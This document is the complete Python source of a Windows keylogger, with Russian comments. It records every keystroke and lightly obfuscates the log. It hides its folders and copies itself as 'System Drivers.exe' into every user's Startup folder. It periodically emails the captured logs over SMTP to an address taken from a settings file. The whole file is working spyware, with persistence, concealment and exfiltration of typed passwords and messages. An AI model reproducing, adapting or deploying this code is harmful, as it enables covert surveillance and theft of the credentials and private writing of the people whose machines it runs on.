#==========(1) Вызовы методов молудей начало ==========
from pynput import keyboard
from shutil import copy
from os import listdir, access, mkdir, W_OK, getlogin, environ, getpid
from os.path import isdir, isfile, basename
from win32process import GetWindowThreadProcessId
from win32gui import GetForegroundWindow
from win32api import GetKeyboardLayoutName, GetKeyboardState, LoadKeyboardLayout, GetKeyboardLayout, SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from time import strftime
from psutil import process_iter
from sys import exit
#==========(2) Для отправки по электронной почте начало ==========
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pickle import dump, load
#==========(2) Для отправки по электронной почте конец ==========
#==========(1) Вызовы методов молудей конец ==========

#========== Отправка электронного письма начало ==========
def send_email(date):
	write_time_date_file_in_write_file('      - - - - Запуск службы отправки файла - - - -      ' + '\n')

	Continue = True
	Access = False
	if isfile(disk_key + main_folder + "data.dat"):
		file_dat = open(disk_key + main_folder + "data.dat", "rb")
		datas = load(file_dat)
		file_dat.close()
	else:
		if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): 
			copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + main_folder)
			return send_email(date)
		else:
			Continue = False
			write_time_date_file_in_write_file('        - - - Отсутвует файл с настрйками - - -        ' + '\n')

	if Continue:

		addr_from = datas[0]                                   # Отправитель
		password  = datas[1]                                   # Пароль от вашей почты

		msg = MIMEMultipart()                                  # Создаем сообщение
		msg['From']    = addr_from                             # Адресат
		msg['To']      = datas[2]                              # Получатель
		msg['Subject'] = 'Файл с новыми данными кейлогера'     # Тема сообщения, которое будет отображаться в письме

		body = 'Здавствуйте! У кейлогера появились новые данные!' # Текст сообщения, которое будет отображено в письме
		msg.attach(MIMEText(body, 'plain'))                    # Добавляем в сообщение текст, которое попадет в тело письма

		#Прикрепление файла
		Access = attach_file(msg, date)

	#======== Этот блок настраивается для каждого почтового провайдера отдельно ================================================
	if Access:
		try:
			smtps = ["gmail", "mail", "yandex"]
			domens = ["com", "ru", "ru"]
			Smtp_ind = 0
			for Smtp in smtps:
				if Smtp in addr_from:
					break
				Smtp_ind += 1
			server = smtplib.SMTP_SSL('smtp.' + smtps[Smtp_ind] + '.' + domens[Smtp_ind], 465) # Создаем объект SMTP
			server.login(addr_from, password)                      # Получаем доступ
			server.send_message(msg)                               # Отправляем сообщение
			server.quit()
			write_time_date_file_in_write_file('       - - - - - Файл успешно отправлен - - - - -      ' + '\n')
		except Exception as err:
			write_time_date_file_in_write_file('  - - - Файл настроек содержит неверные данные - - -   ' + '\n' + 'Code error: ' + str(err) + '\n')
	#===========================================================================================================================
#Прикрепление документа к электронному письму
def attach_file(msg, date):
    filepath = find_date(date, False)
    if not filepath:
        return False
    filename = basename(filepath)                              # Получаем только имя файла
    with open(filepath, encoding='utf-8') as fp:               # Открываем файл для чтения
        file = MIMEText(fp.read())                             # Используем тип MIMEText
        fp.close()                                             # После использования файл обязательно нужно закрыть
    file.add_header('Content-Disposition', 'attachment', filename=filename) # Добавляем заголовки
    msg.attach(file)
    return True
#Получение даты, затем и путя к файлу и возможен ли доступ к файлу
def find_date(date, flag):
	if ('01' in date) or (flag):
		res = recurs_date(moon_all_migration[moon_curent], 0)
		if (res) and (res != moon_curent):
			files = listdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + res)
			try:
				files.remove('dates.dat')
			except:
				write_time_date_file_in_write_file('Error: Отсутсвует файл с датами.' + '\n')
			files.sort()
			if len(files) >= 1:
				return disk_key + main_folder + user_name + '\\' + year_curent + '\\' + res + '\\{}'.format(files[-1])
			else:
				write_time_date_file_in_write_file('     - - - - Нужный файл с данными отсутсвует - - - -  ' + '\n')
				return False
		else:
			write_time_date_file_in_write_file('        - - - Отсутсвует нужная директория - - -           ' + '\n')
			return False
	else:
		try:
			#создаем список с файлами директории
			files = listdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
		except:
			write_time_date_file_in_write_file('Error: Отсутсвует папка с данными.' + '\n' + '       - Переход к поиску в других директориях -       ' + '\n')
			return find_date(date, True)
		try:
			files.remove('dates.dat')
		except:
			write_time_date_file_in_write_file('Error: Отсутсвует файл с датами.' + '\n')
		files.sort()
		#Проверяем : длина списка больше 1? и есть ли упоминание даты в имени файла?
		if len(files) > 1 and date not in files[-2]:
			return disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + '\\{}'.format(files[-2])
		else:
			write_time_date_file_in_write_file('       - Переход к поиску в других директориях -       ' + '\n')
			return find_date(date, True)
#Получение предыдущего месяца(названия директории), который хранится в директории с кейлогером, или получение ответа что ее нет
def recurs_date(moon, val_zapros):
	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon):
		if val_zapros == 12:
			return False
		val_zapros += 1
		return recurs_date(moon_all_migration[moon], val_zapros)
	else:
		return moon
#Функция для проверки отпрвки файла и записи новго файла с датами
def send_control_and_zapis():
	global date_control
	#Еесли дата проверки отличается от текущей
	if date_control != strftime('%d%b'):
		date_control = strftime('%d%b')
		#Если дан положительный ответ об отправке файла по электронной почты
		if  send_control(date_control):
			send_email(date_control)
			#Записываем новый файл с датами
			zapis_dat_date(date_control)
#функция для проверки отпрвлять ли файл или нет
def send_control(date):
	global moon_curent, year_curent
	try:
		if not isdir(disk_key + main_folder): 
			mkdir(disk_key + main_folder)
		if not isdir(disk_key + main_folder + user_name): 
			mkdir(disk_key + main_folder + user_name)
		if not isdir(disk_key + main_folder + user_name + '\\'  + strftime('%Y')):
			mkdir(disk_key + main_folder + user_name + '\\' + strftime('%Y'))
			year_curent = strftime('%Y')
		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b')): 
			mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b'))
			moon_curent = strftime('%b')
		f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "rb")
		dates = load(f)
		values = load(f)
		f.close()
		try:
			return values[dates.index(date)]
		except:
			return True
	except:
		write_time_date_file_in_write_file('Error: Отсутсвует файл с датами. Создание файла с датами.' + '\n')
		zapis_dat_date(date)
		return send_control(date)
#Записываем новый файл с новыми датами
def zapis_dat_date(date_control):
	dates = []
	values = []
	for date in range(int(strftime('%d')), (int(strftime('%d')) + 1), 1):
		if len(str(date)) == 1:
			date = '0' + str(date)
		dates.append(str(date) + strftime('%b'))
		if (date_control == str(date) + strftime('%b')) and ('01' != str(date)):
			values.append(False)
		else:
			values.append(True)
	f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "wb")
	dump(dates, f)
	dump(values, f)
	f.close()
#========== Отправка электронного письма конец ==========

#========== Для шифрования часть 1 начало ==========
#Функция шифрования с использованием бинарного поиска
def code_my_bin(item):
	low, high = 0, 155
	while low <= high:
		mid = (low + high) // 2
		guess = alphabet[mid]
		if guess == item:
			return chr(mid + key)
		if guess > item:
			high = mid - 1
		else:
			low = mid + 1
	return item
#========== Для шифрования часть 1 конец ==========

#==========(1) Запись в файлы часть 1 начало ==========
#==========(2) Для записи в файл с данными начало ==========
#Функция записи в файл времени и даты
def write_time_date_file(time_date_x, time_date_y, disk, message, data_zapis):
	try:
		file = open(disk + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + '\\' + comp_name + '--' + time_date_y + '(' + user_name + ').txt', 'a', encoding = 'utf-8')
		#Если стоит флаг для записи даты
		if data_zapis: file.writelines('\n' + '- - - - - - - - - - ' + time_date_x + ' - - - - - - - - - -' + '\n')
		file.writelines(message)
		file.close()
	except:
		if not isdir(disk_key + main_folder): 
			mkdir(disk_key + main_folder)
		if not isdir(disk_key + main_folder + user_name): 
			mkdir(disk_key + main_folder + user_name)
		if not isdir(disk_key + main_folder + user_name + '\\'  + year_curent):
			mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): 
			mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
		return write_time_date_file(time_date_x, time_date_y, disk, message, data_zapis)
#Функция проверки даты и времени последнего обращения и записи в файл
def write_time_date_file_in_write_file(message):
    global time_date_before
    #Проверка времени и даты
    time_date_curunt = strftime('%H : %M; %d %b')
    #Дата для названия файла
    time_for_name = strftime('%d%b')
    #Если значения отличаются, то пишем в файл текущее время и дату; и присваиваем устаревшей переменной
    if time_date_curunt != time_date_before: 
        data_zapis = 1
        time_date_before = time_date_curunt
    else: data_zapis = 0
    write_time_date_file(time_date_curunt, time_for_name, disk_key, message, data_zapis)
#==========(2) Для записи в файл с данными конец ==========
#==========(2) Для записи в лог файл начало ==========
#Директория для логирования
directories_logs_curent = ''
#Инициализация директории для логирования
def initialization_log_directories():
	global directories_logs_curent
	if not isdir('C:\\Logs'): 
		mkdir('C:\\Logs')
		SetFileAttributes('C:\\Logs', FILE_ATTRIBUTE_HIDDEN)
	if not isdir('C:\\Logs\\' + getlogin()): 
		mkdir('C:\\Logs\\' + getlogin())
	if not isdir('C:\\Logs\\' + getlogin() + '\\' + strftime('%Y')): 
		mkdir('C:\\Logs\\' + getlogin() + '\\' + strftime('%Y'))
	if not isdir('C:\\Logs\\' + getlogin() + '\\' + strftime('%Y') + '\\' + strftime('%b')): 
		mkdir('C:\\Logs\\' + getlogin() + '\\' + strftime('%Y') + '\\' + strftime('%b'))
	directories_logs_curent = 'C:\\Logs\\' + getlogin() + '\\' + strftime('%Y') + '\\' + strftime('%b') + '\\'
#Создание лог файла, в случае критической ошибки
def crytical_log(message):
	log_crytical = open(directories_logs_curent + 'Log_' + strftime('%d%b') + '.txt', 'a', encoding = 'utf-8')
	log_crytical.writelines(strftime('%H : %M; %d %b') + ':\n' + message + '\n')
	log_crytical.close()
#Создание лог файла работы приложения
def work_log(message):
	log_work = open(directories_logs_curent + 'Work_' + strftime('%d%b') + '.txt', 'a', encoding = 'utf-8')
	log_work.writelines(strftime('%H : %M; %d %b') + ' : ' + message + '\n')
	log_work.close()
#==========(2) Для записи в лог файл конец ==========
#==========(1) Запись в файлы часть 1 конец ==========

initialization_log_directories()
work_log("Block: filling in backup directories")
#========== Заполнение бэкап папки поумолчанию начало ==========
#Создание бэкап файлов для файл с насроками электронной почты и файла общих настроек
if not isdir("C:\\ProgramData\\Backups Drivers"): 
	mkdir("C:\\ProgramData\\Backups Drivers")
	SetFileAttributes("C:\\ProgramData\\Backups Drivers", FILE_ATTRIBUTE_HIDDEN)
if not isfile("C:\\ProgramData\\Backups Drivers\\Settings.dat"): 
	try:
		copy("Settings.dat", "C:\\ProgramData\\Backups Drivers")
	except:
		try:
			crytical_log('Error: Копирование бэкап файла с настройками в директорию с бэкап файлами запрещено. Выполяется выход из приложения.')
		except:
			pass
		exit()
if not isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): 
	try:
		copy("data.dat", "C:\\ProgramData\\Backups Drivers")
	except:
		try:
			crytical_log('Error: Копирование бэкап файла с данными в директорию с бэкап файлами запрещено. Отпрвка данных на почту будет прекращено.')
		except:
			pass
#========== Заполнение бэкап папки поумолчанию конец ==========

work_log("Block: User Definition")
#========== Определение пользователей начало ==========
#Получем всех папки и файлы директории с пользователями
all_users = listdir('C:\\Users')
#Те папки и файлы, которые надо удалить из списка, оставив уникальные для каждого
others_users = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public', 'Все пользователи']
#Функция для удаленя со списка со всеми пользователми ненужных файлов или папок
remove_others_users = lambda user: all_users.remove(user) if user in all_users else print('')
#Удаление лишних папок или файлов
for user in others_users: remove_others_users(user)
#========== Определение пользователей конец ==========

work_log("Block: Add to startup")
#========== Добаввление в автозагрузку начало ==========
#Функция добавления в автозагрузку кейлогера всем уникальным пользователм, если есть доступ и скрытие его
add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup') and SetFileAttributes('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System Drivers.exe', FILE_ATTRIBUTE_HIDDEN) if (access('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', W_OK)) and ('System Drivers.exe' not in listdir('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')) else print('')
#Добавление в автозагрузку
for user in all_users: add_auto_for_users(user)
#========== Добаввление в автозагрузку конец ==========

work_log("Block: Reading settings file")
#========== Чтение файла с настройками начало ==========	
SettingsDat = open("C:\\ProgramData\\Backups Drivers\\Settings.dat", "rb")
DataSettings = load(SettingsDat)
SettingsDat.close()
#Главная директрия
main_folder = DataSettings[0]
#Дополнительная директрия, если к первой доступ отсутсвует
dop_folder = DataSettings[1]
#Директрия, в случае, если к дополнительной директори нет доступа, пробуем записать на диск D
folder_for_D = DataSettings[2]
#Ключ для шифрования
main_key = DataSettings[3]
#========== Чтение файла с настройками конец ==========

work_log("Block: For encryption start part 2")
#========== Для шифрования начало часть 2 начало ==========
#Дополнительный(закрытый) ключ, который создается из открытого
dop_key = 0
for value in str(main_key): dop_key += int(value)
key = main_key + dop_key
#Преобразование строки, которая используется в шифровании в отсортированный список
alphabet = sorted('4ыhПЩm%ЗXd)мsЪ?UEюДОКЖЭo<етй;n|1нэYИuxСяп3РХ"6и►скЮТЦ+9гFцr$#&ЕЛvJyрkфЁшл-fjG5wъШSЙМgA@QуaZва7z2RГёУхФЯT^0щcplь\/iV.жW=чБдKбe№:ЬLbВOНDBCt8>_!*оЧqMзIHЫ (,PNА')
#========== Для шифрования начало часть 2 конец ==========

work_log("Block: Language definition")
#========== Определение языка начало ==========
#Язык на момент запуска программы(если 00000409 - английский, 00000419 - русский)
launge = GetKeyboardLayoutName()
#Установка первоночальных переменных
ru_bin, caps_bin, shift_bin, alt_bin, cmd_bin = False, False, False, False, False
#Если True, то язык русский, иначе английский(ну или какой-нибудь другой)
if launge == '00000419': ru_bin = True
#========== Определение языка конец ==========

work_log("Block: Key Definition")
#========== Определение клавиш начало ==========
#Список активных клавиш
list_key = GetKeyboardState()
#Если капс активен, то True
if list_key[20] == 1: caps_bin = True
#Список клавиш alt клавиатуры
list_alt = ['Key.alt_l', 'Key.alt_r']
#Список клавиш shift клавиатуры
list_shift = ['Key.shift', 'Key.shift_r']
#Список клавиш ctrl клавиатуры
list_ctrl = ['Key.ctrl_l', 'Key.ctrl_r']
#Другие клавишы для смены языка
list_others = ['Key.cmd', 'Key.space']
#========== Определение клавиш конец ==========

work_log("Block: Date and Time Definition")
#========== Определение даты и времени начало ==========
#Дата и время при запуске программы
time_date_before = strftime('%H : %M; %d %b')
#Дата для названия файла
time_for_name = strftime('%d%b')
#Текущий мемяц(для создании папки)
moon_curent = strftime('%b')
#Текущий год(для создаия папки)
year_curent = strftime('%Y')
#дата последней проверки
date_control = ''
#========== Определение даты и времени конец ==========

work_log("Block: Determining the remaining settings")
#========== Определение оставшихся настроек начало ==========
#Диск создания папки и файлов в ней по умолчанию
disk_key = 'C:\\'
#Получение имени компьютера
comp_name = environ['COMPUTERNAME']
#Имя пользователя текущей сессии
user_name = getlogin()
#========== Определение оставшихся настроек конец ==========

work_log("Block: Initialization of the main directory and")
#========== Инициализация главной директории и закачка файла с  данными для электронной почты(по возможности) начало ==========
#Запишем в файл время и дату, образованное при запуске программы
#Исключение вызывается, когда папка не найдена или допуск на запись на диск С == False
try:
	if not isdir(disk_key + main_folder): 
		mkdir(disk_key + main_folder)
		SetFileAttributes(disk_key + main_folder, FILE_ATTRIBUTE_HIDDEN)
	if not isfile(disk_key + main_folder + "data.dat"):
		try: 
			copy("data.dat", disk_key + main_folder)
		except:
			if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + main_folder)
			else:
				pass
	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
except:
	#Если есть допуск на запись в диске С
	if access(disk_key, W_OK):
		#Создаем папку main_folder на диске С
		if not isdir(disk_key + dop_folder): 
			mkdir(disk_key + dop_folder)
			SetFileAttributes(disk_key + dop_folder, FILE_ATTRIBUTE_HIDDEN)
		if not isfile(disk_key + dop_folder + "data.dat"): 
			try:
				copy("data.dat", disk_key + dop_folder)
			except:
				if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + dop_folder)
				else:
					pass
		if not isdir(disk_key + dop_folder + user_name): mkdir(disk_key + dop_folder + user_name)
		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent)
		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
		#Меняем главную директорию
		main_folder = dop_folder
	else:
		if access('D:\\', W_OK):
			if not isdir('D:\\' + folder_for_D):
				#Создаем папку main_folder на диске D
				mkdir('D:\\' + folder_for_D)
				SetFileAttributes('D:\\' + folder_for_D, FILE_ATTRIBUTE_HIDDEN)
			#Меняется диск записи
			disk_key = 'D:\\'
			if not isfile(disk_key + folder_for_D + "data.dat"): 
				try:
					copy("data.dat", disk_key + folder_for_D)
				except:
					if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + folder_for_D)
					else: 
						pass
			if not isdir(disk_key + folder_for_D + user_name): mkdir(disk_key + folder_for_D + user_name)
			if not isdir(disk_key + folder_for_D + user_name + '\\' +year_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent)
			if not isdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent)
			#Меняем главную директорию
			main_folder = folder_for_D
		else:
			crytical_log('Error: Отсутвуют права на запись на всех дисках. Выполняется выход из приложения.')
			exit()
	#Повторно записываем время и дату в файл, в созданной или уже имеющейся папке диска С или D, если вызвалось исключене
	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
#========== Инициализация главной директории и закачка файла с  данными для электронной почты(по возможности) конец ==========

work_log("Block: Dictionaries for the application")
#========== Словари для работы приложения начало ==========
#Словарь, используйщийся если зажат шифт, то записывает в файл верхний элемент клавиату какой-либо цифры русской раскладки
dict_ru = {'1' : '!', '2' : '"', '3' : '№',
            '4' : ';', '5' : '%', '6' : ':',
            '7' : '?', '8' : '*', '9' : '(',
            '0' : ')', '.' : ',', '-' : '_', '=' : '+'}
#Словарь, используйщийся если зажат шифт, то записывает в файл верхний элемент клавиату какой-либо цифры английской раскладки
dict_en = {'1' : '!', '2' : '@', '3' : '#',
           '4' : '$', '5' : '%', '6' : '^',
           '7' : '&', '8' : '*', '9' : '(',
           '0' : ')', '-' : '_', '=' : '+',
           '[' : '{', ']' : '}', ';' : ':',
           ',' : '<', '.' : '>'}
#Месяцы, которые ссылаются на предудущие месяцы
moon_all_migration = {'Jan' : 'Dec', 'Feb' : 'Jan', 'Mar' : 'Feb', 'Apr' : 'Mar', 
					  'May' : 'Apr', 'Jun' : 'May', 'Jul' : 'Jun', 'Aug' : 'Jul', 
					  'Sep' : 'Aug', 'Oct' : 'Sep', 'Nov' : 'Oct', 'Dec' : 'Nov'}
#========== Словари для работы приложения конец ==========

#==========(1) Запись в файлы часть 2 начало ==========
#==========(2) Заполение файла с данными начало ==========
#Функция записи в файл с данными
def write_file(key):
    try:
        #Проверяем является ли key буквой или цифрой; Если является - исключение не вызывается, иначе вызывается
        #Для ускорения вызова исключения и для ненужной записи в файл, когда пишется дата и время - а ниже пусто
        provarka = key.char
        if (caps_bin == True) and (shift_bin == True):
            try:
                if ru_bin == True:
                    #Что будем записывать в файл
                    what_zapis = dict_ru[str(key.char)]
                else:
                    what_zapis = dict_en[str(key.char)]
            except:
                what_zapis = str(key.char).lower()
        elif caps_bin == True:
            what_zapis = str(key.char).upper()
        elif shift_bin == True:
            try:
                if ru_bin == True:
                    what_zapis = dict_ru[str(key.char)]
                else:
                    what_zapis = dict_en[str(key.char)]
            except:
                what_zapis = str(key.char).upper()
        else:
            what_zapis = str(key.char).lower()
    except:
        if str(key) == 'Key.space':
            what_zapis = ' '
        elif str(key) == 'Key.enter':
            what_zapis = '\n'
    try:
        write_time_date_file_in_write_file(code_my_bin(what_zapis))
    except:
        pass
#==========(2) Заполение файла с данными конец ==========
#==========(2) Смена языка, который используется для заполения файла с дыннми часть 1 начало ==========
#Функция проверки изменения языка
def change_langue(mass, key):
    global ru_bin
    #Если вводимый символ есть в массиве
    if str(key) in mass:
        #Если зажат альт или шифт или (зажат пуск и нажат пробел)
        if (((alt_bin == True) and (str(key) not in list_alt) and (str(key) not in list_others)) or ((shift_bin == True) and (str(key) not in list_shift) and (str(key) not in list_others)) or ((cmd_bin == True) and (str(key) == 'Key.space'))):
            #Получаем id активного окна
            hdlr = GetForegroundWindow()
            #Получаем id процесса с помощью id окна
            pid = GetWindowThreadProcessId(hdlr)
            #Получем язык активного окна
            ab = GetKeyboardLayout(pid[0])
            #Если язык русский
            if ab == 67699721:
                #Меняем язык на русский
                LoadKeyboardLayout('00000419', 1)
                ru_bin = True
            else:
                #Меняем язык на английский
                LoadKeyboardLayout('00000409', 1)
                ru_bin = False
#==========(2) Смена языка, который используется для заполения файла с дыннми часть 1 конец ========== 
#==========(1) Запись в файлы часть 2 конец ==========

#==========(1) Обработчики нажатия/отжатия начало ==========
#==========(2) Обработчик нажатия начало ==========
#Вызываемая функций класса keyboard.Listener; Вызывается, когда какая-либо кнопка нажимается
def on_press(key):
    global shift_bin, caps_bin, alt_bin, cmd_bin
    #Если нажат шифт
    if str(key) in list_shift:
        #Устанавливаем булево значение нажатие шифта, 1 - клавиша зажата, 0 - отжата
        shift_bin = True
    #Если нажат альт
    if str(key) in list_alt:
        #Устанавливаем булево значение нажатие альта, 1 - клавиша зажата, 0 - отжата
        alt_bin = True
    #Если нажат пуск
    if str(key) == 'Key.cmd':
        #Устанавливаем булево значение нажатие альта, 1 - клавиша зажата, 0 - отжата
        cmd_bin = True
	#========== Смена языка, который используется для заполения файла с дыннми часть 2 начало ==========
    #Функции проверки смены языка
    change_langue(list_shift, key)
    change_langue(list_alt, key)
    change_langue(list_others, key)
	#========== Смена языка, который используется для заполения файла с дыннми часть 2 конец ==========
    #Если нажат капс
    if str(key) == 'Key.caps_lock':
        #Меняем состояние капса
        if caps_bin == True: caps_bin = False
        elif caps_bin == False: caps_bin = True
    #Проверка отправки данных и их отправка
    send_control_and_zapis()
	#========== Запись в файлы часть 3 начало ==========
    #Запись в выбранный файл
    write_file(key)
	#========== Запись в файлы часть 3 начало ==========
#==========(2) Обработчик нажатия конец ==========
#==========(2) Обработчик отжатия начало ==========
#Вызываемая функция класса keyboard.Listener; Вывывается, когда какая-либо кнопка отпускается
def on_release(key):
    global shift_bin, alt_bin, cmd_bin
    #Если отжатая клавиша, это шифт
    if str(key) in list_shift:
        if shift_bin == True: shift_bin = False
    if str(key) in list_alt:
        if alt_bin == True: alt_bin = False
    if str(key) in list_others:
        if cmd_bin == True: cmd_bin = False
#==========(2) Обработчик отжатия конец ==========
#==========(1) Обработчики нажатия/отжатия конец ==========

work_log("Block: Creating a Handler Class")
#========== Создание класса обработчика начало ==========
try:          
    a = keyboard.Listener(on_press = on_press, on_release = on_release)
    a.start()
except Exception as err: 
	write_time_date_file_in_write_file('Error: Раелизация класса приложения запрещена. Выполяется выход из приложения.' + '\n' + 'Code error: ' + str(err) + '\n')
	exit()
#========== Создание класса обработчика конец ==========

write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Запущено - - - - - - - - - -   \n", 0)
send_control_and_zapis()

work_log("Block: Secondary Process Removal")
#========== Удаление вторичного процесса начало ==========
#Функция поиска второго процесса, создаваемого кейлогером и его завершение
def find_process_pid(process_name):
	for process in process_iter():
		if process.name() == process_name:
			if process.pid != getpid():
				try:
					process.kill()
				except: 
					pass
					
find_process_pid('System Drivers.exe')
#========== Удаление вторичного процесса конец ==========

work_log("Block: Starting the end program cycle")
#========== Запуск бксконечного цикла программы считывания нажатия клавиш начало ==========
while 1:
    try:
        a.join()
    except Exception as err: 
    	write_time_date_file_in_write_file('Error: Критическая ошибка. Приложение функционирует в штатном режиме.' + '\n' + 'Code error: ' + str(err) + '\n')
#========== Запуск бксконечного цикла программы считывания нажатия клавиш конец ==========